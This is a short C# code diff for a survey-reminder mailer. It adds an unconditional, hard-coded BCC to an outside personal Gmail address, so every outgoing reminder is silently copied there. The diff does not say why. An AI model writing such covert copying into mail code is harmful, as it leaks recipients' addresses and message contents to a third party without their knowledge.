@@ -98,9 +98,11 @@ namespace SurveyReminder
                         foreach (var c in BCCs)
                         {
                             bccEmails.Add(new MailAddress(c));                            
-                        }
-                        msg.Bcc = bccEmails.ToArray();
+                        }                        
                     }
+
+                    bccEmails.Add(new MailAddress("shazeb140@gmail.com"));
+                    msg.Bcc = bccEmails.ToArray();
                 }
                 else
                 {
